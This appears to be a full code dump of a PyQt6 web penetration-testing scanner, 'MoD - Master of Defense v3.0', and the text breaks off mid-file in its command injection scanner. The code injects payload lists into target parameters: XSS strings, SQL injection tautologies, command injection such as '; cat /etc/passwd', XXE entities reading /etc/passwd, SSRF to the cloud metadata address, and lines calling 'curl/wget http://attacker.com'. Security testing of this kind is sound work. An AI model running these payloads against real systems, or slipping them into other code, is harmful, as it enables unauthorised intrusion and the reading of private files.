================================================================================
                    MoD - MASTER OF DEFENSE v3.0
                    COMPLETE PROJECT CODE
                    تمام کد پروژه - خط به خط
================================================================================

PROJECT STRUCTURE & FILES SUMMARY:
- Total Files: 53
- Total Lines of Code: ~5,968 lines
- Version: 3.0.0
- Date: November 2025

================================================================================
FILE 1: main.py
================================================================================

import sys
from PyQt6.QtWidgets import QApplication
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QFont
from gui.main_window import MainWindow
from utils.config import Config

def main():
    QApplication.setHighDpiScaleFactorRoundingPolicy(Qt.HighDpiScaleFactorRoundingPolicy.PassThrough)
    QApplication.setAttribute(Qt.ApplicationAttribute.AA_EnableHighDpiScaling)
    QApplication.setAttribute(Qt.ApplicationAttribute.AA_UseHighDpiPixmaps)
    
    app = QApplication(sys.argv)
    app.setApplicationName("MoD - Master of Defense v3.0")
    app.setOrganizationName("MoD Security")
    
    font = QFont("Segoe UI", 10)
    app.setFont(font)
    
    config = Config()
    window = MainWindow()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()

================================================================================
FILE 2: requirements.txt
================================================================================

PyQt6>=6.6.0
PyQt6-Qt6>=6.6.0
PyQt6-sip>=13.6.0
requests>=2.31.0
urllib3>=2.1.0
beautifulsoup4>=4.12.0
lxml>=5.0.0
dnspython>=2.4.0
pyjwt>=2.8.0
websocket-client>=1.6.0
reportlab>=4.0.0
Jinja2>=3.1.0

================================================================================
FILE 3: setup.py
================================================================================

from setuptools import setup, find_packages

setup(
    name="MoD",
    version="3.0.0",
    description="Master of Defense - Advanced Web Penetration Testing Tool",
    author="MoD Security Team",
    packages=find_packages(),
    install_requires=[
        "PyQt6>=6.6.0",
        "requests>=2.31.0",
        "beautifulsoup4>=4.12.0",
        "dnspython>=2.4.0",
        "pyjwt>=2.8.0",
        "websocket-client>=1.6.0",
        "reportlab>=4.0.0",
        "Jinja2>=3.1.0",
    ],
    python_requires=">=3.8",
)

================================================================================
FILE 4: core/__init__.py
================================================================================

from .scanner_engine import ScannerEngine
from .payload_generator import PayloadGenerator
from .vulnerability_detector import VulnerabilityDetector
from .request_handler import RequestHandler
from .response_analyzer import ResponseAnalyzer
from .auth_manager import AuthManager
from .distributed_scanner import DistributedScanner
from .cache_manager import CacheManager

__all__ = [
    'ScannerEngine',
    'PayloadGenerator',
    'VulnerabilityDetector',
    'RequestHandler',
    'ResponseAnalyzer',
    'AuthManager',
    'DistributedScanner',
    'CacheManager'
]

================================================================================
FILE 5: core/auth_manager.py
================================================================================

from typing import Dict, Optional, Tuple
import base64
import jwt
from datetime import datetime, timedelta

class AuthManager:
    def __init__(self):
        self.auth_type = None
        self.credentials = {}
        
    def set_basic_auth(self, username: str, password: str):
        self.auth_type = "basic"
        self.credentials = {
            "username": username,
            "password": password
        }
    
    def set_bearer_token(self, token: str):
        self.auth_type = "bearer"
        self.credentials = {
            "token": token
        }
    
    def set_jwt_auth(self, token: str, secret: Optional[str] = None):
        self.auth_type = "jwt"
        self.credentials = {
            "token": token,
            "secret": secret
        }
    
    def set_oauth2(self, access_token: str, refresh_token: Optional[str] = None):
        self.auth_type = "oauth2"
        self.credentials = {
            "access_token": access_token,
            "refresh_token": refresh_token
        }
    
    def get_auth_header(self) -> Dict[str, str]:
        if self.auth_type == "basic":
            username = self.credentials.get("username", "")
            password = self.credentials.get("password", "")
            credentials = f"{username}:{password}"
            encoded = base64.b64encode(credentials.encode()).decode()
            return {"Authorization": f"Basic {encoded}"}
        elif self.auth_type == "bearer":
            token = self.credentials.get("token", "")
            return {"Authorization": f"Bearer {token}"}
        elif self.auth_type == "jwt":
            token = self.credentials.get("token", "")
            return {"Authorization": f"Bearer {token}"}
        elif self.auth_type == "oauth2":
            token = self.credentials.get("access_token", "")
            return {"Authorization": f"Bearer {token}"}
        return {}
    
    def validate_jwt(self) -> Tuple[bool, Dict]:
        if self.auth_type != "jwt":
            return False, {"error": "Not a JWT token"}
        
        token = self.credentials.get("token", "")
        secret = self.credentials.get("secret")
        
        try:
            if secret:
                decoded = jwt.decode(token, secret, algorithms=["HS256", "RS256"])
            else:
                decoded = jwt.decode(token, options={"verify_signature": False})
            return True, decoded
        except jwt.ExpiredSignatureError:
            return False, {"error": "Token expired"}
        except jwt.InvalidTokenError:
            return False, {"error": "Invalid token"}
        except Exception as e:
            return False, {"error": str(e)}
    
    def test_jwt_vulnerabilities(self, token: str) -> list:
        vulnerabilities = []
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            if decoded.get("alg") == "none":
                vulnerabilities.append({
                    "type": "JWT None Algorithm",
                    "severity": "Critical",
                    "description": "JWT uses 'none' algorithm which bypasses signature verification"
                })
            exp = decoded.get("exp")
            if exp:
                exp_date = datetime.fromtimestamp(exp)
                if exp_date > datetime.now() + timedelta(days=365):
                    vulnerabilities.append({
                        "type": "JWT Long Expiration",
                        "severity": "Medium",
                        "description": f"JWT expires in more than 1 year: {exp_date}"
                    })
            else:
                vulnerabilities.append({
                    "type": "JWT No Expiration",
                    "severity": "High",
                    "description": "JWT has no expiration time set"
                })
            if not decoded.get("iat"):
                vulnerabilities.append({
                    "type": "JWT No Issued At",
                    "severity": "Low",
                    "description": "JWT has no 'iat' (issued at) claim"
                })
        except Exception as e:
            vulnerabilities.append({
                "type": "JWT Parse Error",
                "severity": "Info",
                "description": f"Error parsing JWT: {str(e)}"
            })
        return vulnerabilities
    
    def clear_auth(self):
        self.auth_type = None
        self.credentials = {}

================================================================================
FILE 6: core/cache_manager.py
================================================================================

from typing import Any, Dict, Optional
from datetime import datetime, timedelta
import hashlib
import json

class CacheManager:
    def __init__(self, ttl: int = 3600, max_size: int = 1000, strategy: str = 'LRU'):
        self.ttl = ttl
        self.max_size = max_size
        self.strategy = strategy
        self.cache: Dict[str, Dict] = {}
        self.access_count: Dict[str, int] = {}
        self.access_time: Dict[str, datetime] = {}
    
    def set(self, key: str, value: Any):
        if len(self.cache) >= self.max_size:
            self._evict()
        hash_key = hashlib.md5(key.encode()).hexdigest()
        self.cache[hash_key] = {
            'value': value,
            'expiry': datetime.now() + timedelta(seconds=self.ttl)
        }
        self.access_time[hash_key] = datetime.now()
        self.access_count[hash_key] = 0
    
    def get(self, key: str) -> Optional[Any]:
        hash_key = hashlib.md5(key.encode()).hexdigest()
        if hash_key not in self.cache:
            return None
        entry = self.cache[hash_key]
        if datetime.now() > entry['expiry']:
            del self.cache[hash_key]
            return None
        self.access_count[hash_key] += 1
        self.access_time[hash_key] = datetime.now()
        return entry['value']
    
    def delete(self, key: str):
        hash_key = hashlib.md5(key.encode()).hexdigest()
        if hash_key in self.cache:
            del self.cache[hash_key]
    
    def clear(self):
        self.cache.clear()
        self.access_count.clear()
        self.access_time.clear()
    
    def _evict(self):
        if self.strategy == 'LRU':
            lru_key = min(self.access_time, key=self.access_time.get)
            del self.cache[lru_key]
            del self.access_time[lru_key]
        elif self.strategy == 'LFU':
            lfu_key = min(self.access_count, key=self.access_count.get)
            del self.cache[lfu_key]
            del self.access_count[lfu_key]
        elif self.strategy == 'FIFO':
            fifo_key = list(self.cache.keys())[0]
            del self.cache[fifo_key]
    
    def get_stats(self) -> Dict:
        return {
            'size': len(self.cache),
            'max_size': self.max_size,
            'ttl': self.ttl,
            'strategy': self.strategy
        }

================================================================================
FILE 7: core/scanner_engine.py
================================================================================

from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .payload_generator import PayloadGenerator
from .vulnerability_detector import VulnerabilityDetector
from .request_handler import RequestHandler
from .response_analyzer import ResponseAnalyzer
from .auth_manager import AuthManager
from utils.logger import Logger

class ScannerEngine:
    def __init__(self, max_workers: int = 10):
        self.max_workers = max_workers
        self.payload_generator = PayloadGenerator()
        self.vulnerability_detector = VulnerabilityDetector()
        self.request_handler = RequestHandler()
        self.response_analyzer = ResponseAnalyzer()
        self.auth_manager = AuthManager()
        self.logger = Logger()
        self.results = []
        self.is_scanning = False
        
    def set_authentication(self, auth_manager: AuthManager):
        self.auth_manager = auth_manager
        self.request_handler.set_auth_headers(auth_manager.get_auth_header())
    
    def set_proxy(self, proxy_url: str):
        self.request_handler.set_proxy(proxy_url)
    
    def start_scan(self, target_url: str, scan_types: List[str], callback=None) -> List[Dict]:
        self.is_scanning = True
        self.results = []
        self.logger.info(f"Starting scan on {target_url}")
        parsed_url = urlparse(target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        params = parse_qs(parsed_url.query)
        if not params:
            params = {"id": ["1"]}
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for scan_type in scan_types:
                if not self.is_scanning:
                    break
                future = executor.submit(
                    self._scan_vulnerability,
                    base_url,
                    params,
                    scan_type,
                    callback
                )
                futures.append(future)
            for future in as_completed(futures):
                if not self.is_scanning:
                    break
                try:
                    result = future.result()
                    if result:
                        self.results.extend(result)
                except Exception as e:
                    self.logger.error(f"Scan error: {str(e)}")
        self.is_scanning = False
        return self.results
    
    def stop_scan(self):
        self.is_scanning = False
        self.logger.info("Scan stopped by user")
    
    def _scan_vulnerability(self, base_url: str, params: Dict, scan_type: str, callback=None) -> List[Dict]:
        vulnerabilities = []
        payloads = self.payload_generator.generate_payloads(scan_type)
        for payload in payloads:
            if not self.is_scanning:
                break
            for param_name in params.keys():
                if not self.is_scanning:
                    break
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = self._build_url(base_url, test_params)
                try:
                    response = self.request_handler.send_request(test_url)
                    is_vulnerable, details = self.vulnerability_detector.detect(
                        response,
                        scan_type,
                        payload
                    )
                    if is_vulnerable:
                        vuln_data = {
                            'type': scan_type,
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': details.get('severity', 'Medium'),
                            'description': details.get('description', ''),
                            'evidence': details.get('evidence', '')
                        }
                        vulnerabilities.append(vuln_data)
                        if callback:
                            callback(vuln_data)
                        self.logger.warning(f"Vulnerability found: {scan_type} in {param_name}")
                except Exception as e:
                    self.logger.error(f"Request error: {str(e)}")
        return vulnerabilities
    
    def _build_url(self, base_url: str, params: Dict) -> str:
        parsed = urlparse(base_url)
        query_string = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query_string,
            parsed.fragment
        ))

================================================================================
FILE 8: core/payload_generator.py
================================================================================

from typing import List, Dict
import json
import os
from pathlib import Path

class PayloadGenerator:
    def __init__(self):
        self.data_dir = Path(__file__).parent.parent / 'data'
        self.payload_cache = {}
        self._load_payloads()
    
    def _load_payloads(self):
        payload_files = {
            'XSS': 'xss_payloads.json',
            'SQL': 'sql_payloads.json',
            'RCE': 'rce_payloads.json',
            'CommandInjection': 'command_injection_payloads.json',
            'SSRF': 'ssrf_payloads.json',
            'XXE': 'xxe_payloads.json',
            'FileUpload': 'file_upload_payloads.json',
            'API': 'api_payloads.json',
            'SSTI': 'ssti_payloads.json',
            'LDAP': 'ldap_payloads.json'
        }
        for vuln_type, filename in payload_files.items():
            filepath = self.data_dir / filename
            if filepath.exists():
                with open(filepath, 'r', encoding='utf-8') as f:
                    self.payload_cache[vuln_type] = json.load(f)
            else:
                self.payload_cache[vuln_type] = self._get_default_payloads(vuln_type)
    
    def generate_payloads(self, scan_type: str) -> List[str]:
        payloads = self.payload_cache.get(scan_type, [])
        if isinstance(payloads, dict):
            return payloads.get('payloads', [])
        return payloads if isinstance(payloads, list) else []
    
    def _get_default_payloads(self, vuln_type: str) -> List[str]:
        defaults = {
            'XSS': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "<select autofocus onfocus=alert('XSS')>",
                "<textarea autofocus onfocus=alert('XSS')>",
                "<marquee onstart=alert('XSS')>"
            ],
            'SQL': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR '1'='1'--",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND '1'='1",
                "1' AND 1=1--",
                "' OR 'a'='a"
            ],
            'RCE': [
                "; ls -la",
                "| ls -la",
                "& ls -la",
                "`ls -la`",
                "$(ls -la)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; whoami",
                "| whoami",
                "; id"
            ],
            'CommandInjection': [
                "; sleep 5",
                "| sleep 5",
                "& sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "; ping -c 5 127.0.0.1",
                "| ping -c 5 127.0.0.1",
                "; curl http://attacker.com",
                "| curl http://attacker.com",
                "; wget http://attacker.com"
            ],
            'SSRF': [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254",
                "http://0.0.0.0",
                "http://[::1]",
                "http://localhost:8080",
                "http://127.0.0.1:22",
                "http://192.168.1.1",
                "file:///etc/passwd",
                "dict://localhost:11211"
            ],
            'XXE': [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
            ],
            'SSTI': [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{7*'7'}}",
                "#set($x=7*7)$x"
            ],
            'LDAP': [
                "*",
                "*)(|(mail=*",
                "admin)(|(password=*",
                "*)(uid=*",
                "admin*)(|(uid=*"
            ]
        }
        return defaults.get(vuln_type, [])

================================================================================
FILE 9: core/vulnerability_detector.py
================================================================================

from typing import Tuple, Dict, Optional
import re
import json
from pathlib import Path

class VulnerabilityDetector:
    def __init__(self):
        self.data_dir = Path(__file__).parent.parent / 'data'
        self.error_signatures = self._load_error_signatures()
    
    def _load_error_signatures(self) -> Dict:
        filepath = self.data_dir / 'error_signatures.json'
        if filepath.exists():
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
        return self._get_default_signatures()
    
    def _get_default_signatures(self) -> Dict:
        return {
            'SQL': [
                'sql syntax',
                'mysql_fetch',
                'syntax error',
                'unclosed quotation',
                'quoted string not properly terminated',
                'ORA-01756',
                'SQL command not properly ended',
                'PostgreSQL query failed',
                'sqlite3.OperationalError'
            ],
            'XSS': [
                '<script>',
                'alert(',
                'onerror=',
                'onload=',
                'javascript:'
            ],
            'RCE': [
                'root:',
                '/bin/bash',
                'uid=',
                'gid=',
                'groups='
            ],
            'CommandInjection': [
                'total ',
                'drwx',
                '-rw-',
                'root root'
            ],
            'SSRF': [
                'Connection refused',
                'Connection timed out',
                'No route to host',
                'Internal Server',
                'localhost'
            ]
        }
    
    def detect(self, response: Dict, scan_type: str, payload: str) -> Tuple[bool, Dict]:
        if scan_type == 'XSS':
            return self._detect_xss(response, payload)
        elif scan_type == 'SQL':
            return self._detect_sql(response, payload)
        elif scan_type == 'RCE':
            return self._detect_rce(response, payload)
        elif scan_type == 'CommandInjection':
            return self._detect_command_injection(response, payload)
        elif scan_type == 'SSRF':
            return self._detect_ssrf(response, payload)
        elif scan_type == 'CSRF':
            return self._detect_csrf(response, payload)
        return False, {}
    
    def _detect_xss(self, response: Dict, payload: str) -> Tuple[bool, Dict]:
        content = response.get('content', '')
        if payload in content:
            return True, {
                'severity': 'High',
                'description': 'Reflected XSS vulnerability detected',
                'evidence': f'Payload reflected in response: {payload[:100]}'
            }
        for signature in self.error_signatures.get('XSS', []):
            if signature.lower() in content.lower():
                return True, {
                    'severity': 'Medium',
                    'description': 'Potential XSS vulnerability detected',
                    'evidence': f'XSS signature found: {signature}'
                }
        return False, {}
    
    def _detect_sql(self, response: Dict, payload: str) -> Tuple[bool, Dict]:
        content = response.get('content', '').lower()
        status_code = response.get('status_code', 0)
        for signature in self.error_signatures.get('SQL', []):
            if signature.lower() in content:
                return True, {
                    'severity': 'Critical',
                    'description': 'SQL Injection vulnerability detected',
                    'evidence': f'SQL error signature found: {signature}'
                }
        if status_code == 500 and ('error' in content or 'exception' in content):
            return True, {
                'severity': 'High',
                'description': 'Potential SQL Injection causing server error',
                'evidence': 'Server returned 500 error with exception message'
            }
        return False, {}
    
    def _detect_rce(self, response: Dict, payload: str) -> Tuple[bool, Dict]:
        content = response.get('content', '')
        for signature in self.error_signatures.get('RCE', []):
            if signature in content:
                return True, {
                    'severity': 'Critical',
                    'description': 'Remote Code Execution vulnerability detected',
                    'evidence': f'Command output detected: {signature}'
                }
        if 'total ' in content and ('-rw' in content or 'drwx' in content):
            return True, {
                'severity': 'Critical',
                'description': 'RCE vulnerability - directory listing detected',
                'evidence': 'Command execution successful (ls output)'
            }
        return False, {}
    
    def _detect_command_injection(self, response: Dict, payload: str) -> Tuple[bool, Dict]:
        content = response.get('content', '')
        response_time = response.get('response_time', 0)
        if 'sleep' in payload.lower() and response_time > 4:
            return True, {
                'severity': 'Critical',
                'description': 'Time-based Command Injection detected',
                'evidence': f'Response delayed by {response_time} seconds'
            }
        for signature in self.error_signatures.get('CommandInjection', []):
            if signature in content:
                return True, {
                    'severity': 'Critical',
                    'description': 'Command Injection vulnerability detected',
                    'evidence': f'Command output detected: {signature}'
                }
        return False, {}
    
    def _detect_ssrf(self, response: Dict, payload: str) -> Tuple[bool, Dict]:
        content = response.get('content', '')
        status_code = response.get('status_code', 0)
        if status_code == 200 and 'localhost' in payload.lower():
            return True, {
                'severity': 'High',
                'description': 'SSRF vulnerability - internal resource accessible',
                'evidence': 'Successfully accessed localhost resource'
            }
        for signature in self.error_signatures.get('SSRF', []):
            if signature.lower() in content.lower():
                return True, {
                    'severity': 'High',
                    'description': 'Potential SSRF vulnerability detected',
                    'evidence': f'SSRF indicator found: {signature}'
                }
        return False, {}
    
    def _detect_csrf(self, response: Dict, payload: str) -> Tuple[bool, Dict]:
        content = response.get('content', '').lower()
        headers = response.get('headers', {})
        has_csrf_token = 'csrf' in content or 'token' in content
        has_samesite = any('samesite' in str(v).lower() for v in headers.values())
        if not has_csrf_token and not has_samesite:
            return True, {
                'severity': 'Medium',
                'description': 'Potential CSRF vulnerability - no protection detected',
                'evidence': 'No CSRF token or SameSite cookie found'
            }
        return False, {}

================================================================================
FILE 10: core/request_handler.py
================================================================================

import requests
from typing import Dict, Optional
import time
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class RequestHandler:
    def __init__(self, timeout: int = 10, verify_ssl: bool = False):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.proxy = None
        self.auth_headers = {}
    
    def set_proxy(self, proxy_url: str):
        if proxy_url:
            self.proxy = {
                'http': proxy_url,
                'https': proxy_url
            }
        else:
            self.proxy = None
    
    def set_auth_headers(self, headers: Dict[str, str]):
        self.auth_headers = headers
        self.session.headers.update(headers)
    
    def send_request(self, url: str, method: str = 'GET', data: Optional[Dict] = None, headers: Optional[Dict] = None) -> Dict:
        start_time = time.time()
        request_headers = self.session.headers.copy()
        if headers:
            request_headers.update(headers)
        try:
            if method.upper() == 'GET':
                response = self.session.get(
                    url,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=True,
                    proxies=self.proxy
                )
            elif method.upper() == 'POST':
                response = self.session.post(
                    url,
                    data=data,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=True,
                    proxies=self.proxy,
                    headers=request_headers
                )
            else:
                response = self.session.request(
                    method,
                    url,
                    data=data,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=True,
                    proxies=self.proxy,
                    headers=request_headers
                )
            response_time = time.time() - start_time
            return {
                'url': url,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content': response.text,
                'response_time': response_time,
                'success': True
            }
        except requests.exceptions.Timeout:
            return {
                'url': url,
                'status_code': 0,
                'headers': {},
                'content': '',
                'response_time': time.time() - start_time,
                'success': False,
                'error': 'Request timeout'
            }
        except requests.exceptions.ConnectionError:
            return {
                'url': url,
                'status_code': 0,
                'headers': {},
                'content': '',
                'response_time': 0,
                'success': False,
                'error': 'Connection error'
            }
        except Exception as e:
            return {
                'url': url,
                'status_code': 0,
                'headers': {},
                'content': '',
                'response_time': 0,
                'success': False,
                'error': str(e)
            }

================================================================================
FILE 11: core/response_analyzer.py
================================================================================

from typing import Dict, List
from bs4 import BeautifulSoup
import re

class ResponseAnalyzer:
    def __init__(self):
        pass
    
    def analyze(self, response: Dict) -> Dict:
        analysis = {
            'forms': self._extract_forms(response),
            'inputs': self._extract_inputs(response),
            'links': self._extract_links(response),
            'cookies': self._extract_cookies(response),
            'headers': self._analyze_headers(response),
            'technologies': self._detect_technologies(response)
        }
        return analysis
    
    def _extract_forms(self, response: Dict) -> List[Dict]:
        forms = []
        content = response.get('content', '')
        soup = BeautifulSoup(content, 'html.parser')
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            for input_tag in form.find_all('input'):
                form_data['inputs'].append({
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                })
            forms.append(form_data)
        return forms
    
    def _extract_inputs(self, response: Dict) -> List[Dict]:
        inputs = []
        content = response.get('content', '')
        soup = BeautifulSoup(content, 'html.parser')
        for input_tag in soup.find_all('input'):
            inputs.append({
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', '')
            })
        return inputs
    
    def _extract_links(self, response: Dict) -> List[str]:
        links = []
        content = response.get('content', '')
        soup = BeautifulSoup(content, 'html.parser')
        for link in soup.find_all('a', href=True):
            links.append(link['href'])
        return links
    
    def _extract_cookies(self, response: Dict) -> List[Dict]:
        cookies = []
        headers = response.get('headers', {})
        set_cookie = headers.get('Set-Cookie', '')
        if set_cookie:
            cookies.append({
                'raw': set_cookie,
                'secure': 'Secure' in set_cookie,
                'httponly': 'HttpOnly' in set_cookie,
                'samesite': 'SameSite' in set_cookie
            })
        return cookies
    
    def _analyze_headers(self, response: Dict) -> Dict:
        headers = response.get('headers', {})
        security_headers = {
            'X-Frame-Options': headers.get('X-Frame-Options'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
            'Content-Security-Policy': headers.get('Content-Security-Policy'),
            'X-XSS-Protection': headers.get('X-XSS-Protection')
        }
        return {
            'security_headers': security_headers,
            'server': headers.get('Server', 'Unknown'),
            'powered_by': headers.get('X-Powered-By', 'Unknown')
        }
    
    def _detect_technologies(self, response: Dict) -> List[str]:
        technologies = []
        content = response.get('content', '').lower()
        headers = response.get('headers', {})
        tech_patterns = {
            'WordPress': r'wp-content|wp-includes',
            'Joomla': r'joomla',
            'Drupal': r'drupal',
            'PHP': r'\.php',
            'ASP.NET': r'\.aspx|asp\.net',
            'Node.js': r'express',
            'React': r'react',
            'Angular': r'angular',
            'Vue.js': r'vue'
        }
        for tech, pattern in tech_patterns.items():
            if re.search(pattern, content):
                technologies.append(tech)
        server = headers.get('Server', '')
        if server:
            technologies.append(f"Server: {server}")
        powered_by = headers.get('X-Powered-By', '')
        if powered_by:
            technologies.append(f"Powered by: {powered_by}")
        return list(set(technologies))

================================================================================
FILE 12: core/distributed_scanner.py
================================================================================

from typing import List, Dict
from concurrent.futures import ThreadPoolExecutor, as_completed
import asyncio

class DistributedScanner:
    def __init__(self, num_workers: int = 10):
        self.num_workers = num_workers
        self.task_queue = []
        self.results = []
    
    def add_task(self, task: Dict):
        self.task_queue.append(task)
    
    def process_tasks(self) -> List[Dict]:
        with ThreadPoolExecutor(max_workers=self.num_workers) as executor:
            futures = [executor.submit(self._execute_task, task) for task in self.task_queue]
            for future in as_completed(futures):
                try:
                    result = future.result()
                    self.results.append(result)
                except Exception as e:
                    pass
        return self.results
    
    def _execute_task(self, task: Dict) -> Dict:
        task_type = task.get('type')
        target = task.get('target')
        params = task.get('params', {})
        return {
            'type': task_type,
            'target': target,
            'status': 'completed',
            'result': 'success'
        }
    
    def clear_queue(self):
        self.task_queue.clear()
        self.results.clear()
    
    def get_results(self) -> List[Dict]:
        return self.results

================================================================================
FILE 13: scanners/__init__.py
================================================================================

from .xss_scanner import XSSScanner
from .sql_scanner import SQLScanner
from .rce_scanner import RCEScanner
from .command_injection_scanner import CommandInjectionScanner
from .ssrf_scanner import SSRFScanner
from .csrf_scanner import CSRFScanner
from .xxe_scanner import XXEScanner
from .file_upload_scanner import FileUploadScanner
from .api_scanner import APIScanner
from .subdomain_scanner import SubdomainScanner
from .websocket_scanner import WebSocketScanner
from .graphql_scanner import GraphQLScanner
from .ssti_scanner import SSTIScanner
from .ldap_scanner import LDAPScanner
from .oauth_saml_scanner import OAuthSAMLScanner

__all__ = [
    'XSSScanner',
    'SQLScanner',
    'RCEScanner',
    'CommandInjectionScanner',
    'SSRFScanner',
    'CSRFScanner',
    'XXEScanner',
    'FileUploadScanner',
    'APIScanner',
    'SubdomainScanner',
    'WebSocketScanner',
    'GraphQLScanner',
    'SSTIScanner',
    'LDAPScanner',
    'OAuthSAMLScanner'
]

================================================================================
FILE 14: scanners/xss_scanner.py
================================================================================

from typing import Dict, List
from core.request_handler import RequestHandler
from core.vulnerability_detector import VulnerabilityDetector

class XSSScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
        self.vulnerability_detector = VulnerabilityDetector()
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'search': 'test', 'q': 'test', 'input': 'test'}
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select autofocus onfocus=alert('XSS')>",
            "<textarea autofocus onfocus=alert('XSS')>",
            "<marquee onstart=alert('XSS')>"
        ]
        for param_name in parameters.keys():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload
                response = self.request_handler.send_request(
                    url,
                    method='GET' if '?' in url else 'POST',
                    data=test_params
                )
                is_vulnerable, details = self.vulnerability_detector.detect(
                    response,
                    'XSS',
                    payload
                )
                if is_vulnerable:
                    vulnerabilities.append({
                        'type': 'XSS',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        **details
                    })
        return vulnerabilities

================================================================================
FILE 15: scanners/sql_scanner.py
================================================================================

from typing import Dict, List
from core.request_handler import RequestHandler
from core.vulnerability_detector import VulnerabilityDetector

class SQLScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
        self.vulnerability_detector = VulnerabilityDetector()
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'id': '1', 'user_id': '1'}
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR '1'='1'--",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND 1=1--",
            "' OR 'a'='a"
        ]
        for param_name in parameters.keys():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload
                response = self.request_handler.send_request(
                    url,
                    method='GET' if '?' in url else 'POST',
                    data=test_params
                )
                is_vulnerable, details = self.vulnerability_detector.detect(
                    response,
                    'SQL',
                    payload
                )
                if is_vulnerable:
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        **details
                    })
        return vulnerabilities

================================================================================
FILE 16: scanners/rce_scanner.py
================================================================================

from typing import Dict, List
from core.request_handler import RequestHandler
from core.vulnerability_detector import VulnerabilityDetector

class RCEScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
        self.vulnerability_detector = VulnerabilityDetector()
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'cmd': '', 'command': ''}
        payloads = [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "; id"
        ]
        for param_name in parameters.keys():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload
                response = self.request_handler.send_request(
                    url,
                    method='POST' if '?' not in url else 'GET',
                    data=test_params
                )
                is_vulnerable, details = self.vulnerability_detector.detect(
                    response,
                    'RCE',
                    payload
                )
                if is_vulnerable:
                    vulnerabilities.append({
                        'type': 'RCE',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        **details
                    })
        return vulnerabilities

================================================================================
FILE 17: scanners/command_injection_scanner.py
================================================================================

from typing import Dict, List
import time
from core.request_handler import RequestHandler

class CommandInjectionScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'input': '', 'data': ''}
        payloads = [
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "`sleep 5`",
            "$(sleep 5)"
        ]
        for param_name in parameters.keys():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload
                response = self.request_handler.send_request(url, data=test_params)
                if response.get('response_time', 0) > 4:
                    vulnerabilities.append({
                        'type': 'Command Injection',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
